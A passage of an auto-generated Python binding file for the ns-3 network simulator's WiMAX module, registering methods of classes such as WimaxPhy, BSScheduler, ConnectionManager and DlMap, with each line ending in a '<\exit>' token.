[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetPhyType',<\exit>
'ns3::WimaxPhy::PhyType',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetPsDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPsPerFrame',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPsPerSymbol',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetReceiveCallback',<\exit>
'ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRxFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetScanningFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetState',<\exit>
'ns3::WimaxPhy::PhyState',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolsPerFrame',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTxFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsDuplex',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::SendParams *', 'params')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetChannelBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'channelBandwidth')])<\exit>
cls.add_method('SetDataRates',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetDevice',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxNetDevice >', 'device')])<\exit>
cls.add_method('SetDuplex',<\exit>
'void',<\exit>
[param('uint64_t', 'rxFrequency'), param('uint64_t', 'txFrequency')])<\exit>
cls.add_method('SetFrameDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'frameDuration')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('SetMobility',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Object >', 'mobility')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNrCarriers',<\exit>
'void',<\exit>
[param('uint8_t', 'nrCarriers')])<\exit>
cls.add_method('SetPhyParameters',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetPsDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'psDuration')])<\exit>
cls.add_method('SetPsPerFrame',<\exit>
'void',<\exit>
[param('uint16_t', 'psPerFrame')])<\exit>
cls.add_method('SetPsPerSymbol',<\exit>
'void',<\exit>
[param('uint16_t', 'psPerSymbol')])<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('SetScanningCallback',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSimplex',<\exit>
'void',<\exit>
[param('uint64_t', 'frequency')])<\exit>
cls.add_method('SetState',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::PhyState', 'state')])<\exit>
cls.add_method('SetSymbolDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'symbolDuration')])<\exit>
cls.add_method('SetSymbolsPerFrame',<\exit>
'void',<\exit>
[param('uint32_t', 'symbolsPerFrame')])<\exit>
cls.add_method('StartScanning',<\exit>
'void',<\exit>
[param('uint64_t', 'frequency'), param('ns3::Time', 'timeout'), param('ns3::Callback< void, bool, unsigned long long, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrSymbols',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetDataRates',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetPhyParameters',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeAccessor_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeAccessor const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Get',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase const *', 'object'), param('ns3::AttributeValue &', 'attribute')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasGetter',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasSetter',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'object', transfer_ownership=False), param('ns3::AttributeValue const &', 'value')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeChecker_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeChecker const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Check',<\exit>
'bool',<\exit>
[param('ns3::AttributeValue const &', 'value')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Copy',<\exit>
'bool',<\exit>
[param('ns3::AttributeValue const &', 'source'), param('ns3::AttributeValue &', 'destination')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Create',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('CreateValidValue',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[param('ns3::AttributeValue const &', 'value')],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnderlyingTypeInformation',<\exit>
'std::string',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValueTypeName',<\exit>
'std::string',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasUnderlyingTypeInformation',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3BSScheduler_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSScheduler const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('CheckForFragmentation',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('int', 'availableSymbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetBs',<\exit>
'ns3::Ptr< ns3::BaseStationNetDevice >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetBs',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3BSSchedulerRtps_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSSchedulerRtps const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_virtual=True)<\exit>
cls.add_method('BSSchedulerBEConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerBasicConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerBroadcastConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerInitialRangingConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerNRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerPrimaryConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerUGSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectBEConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectIRandBCConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectMenagementConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectNRTPSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectRTPSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectUGSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
return<\exit>
def register_Ns3BSSchedulerSimple_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSSchedulerSimple const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3BandwidthRequestHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BandwidthRequestHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBr',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHt',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBr',<\exit>
'void',<\exit>
[param('uint32_t', 'br')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetEc',<\exit>
'void',<\exit>
[param('uint8_t', 'ec')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
cls.add_method('SetHt',<\exit>
'void',<\exit>
[param('uint8_t', 'HT')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('check_hcs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3BsServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BsServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'device')])<\exit>
cls.add_method('AddMulticastServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf'), param('ns3::WimaxPhy::ModulationType', 'modulation')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AllocateServiceFlows',<\exit>
'void',<\exit>
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDsaAckTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('uint32_t', 'sfid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('ProcessDsaAck',<\exit>
'void',<\exit>
[param('ns3::DsaAck const &', 'dsaAck'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('ProcessDsaReq',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetMaxDsaRspRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxDsaRspRetries')])<\exit>
return<\exit>
def register_Ns3CallbackChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3CallbackImplBase_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackImplBase const &', 'arg0')])<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::CallbackImplBase const >', 'other')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3CallbackValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CallbackValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackBase const &', 'base')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::CallbackBase', 'base')])<\exit>
return<\exit>
def register_Ns3Channel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Channel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3ConnectionManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ConnectionManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('AllocateManagementConnections',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::RngRsp *', 'rngrsp')])<\exit>
cls.add_method('CreateConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('GetConnections',<\exit>
'std::vector< ns3::Ptr< ns3::WimaxConnection > >',<\exit>
[param('ns3::Cid::Type', 'type')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNPackets',<\exit>
'uint32_t',<\exit>
[param('ns3::Cid::Type', 'type'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCidFactory',<\exit>
'void',<\exit>
[param('ns3::CidFactory *', 'cidFactory')])<\exit>
return<\exit>
def register_Ns3Dcd_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Dcd const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlBurstProfile',<\exit>
'void',<\exit>
[param('ns3::OfdmDlBurstProfile', 'dlBurstProfile')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelEncodings',<\exit>
'ns3::OfdmDcdChannelEncodings',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlBurstProfiles',<\exit>
'std::vector< ns3::OfdmDlBurstProfile >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrDlBurstProfiles',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetChannelEncodings',<\exit>
'void',<\exit>
[param('ns3::OfdmDcdChannelEncodings', 'channelEncodings')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'configurationChangeCount')])<\exit>
cls.add_method('SetNrDlBurstProfiles',<\exit>
'void',<\exit>
[param('uint8_t', 'nrDlBurstProfiles')])<\exit>
return<\exit>
def register_Ns3DlMap_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DlMap const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlMapElement',<\exit>
'void',<\exit>
[param('ns3::OfdmDlMapIe', 'dlMapElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDcdCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlMapElements',<\exit>
'std::list< ns3::OfdmDlMapIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationID')])<\exit>
cls.add_method('SetDcdCount',<\exit>
'void',<\exit>
[param('uint8_t', 'dcdCount')])<\exit>
return<\exit>
def register_Ns3DsaAck_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaAck const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
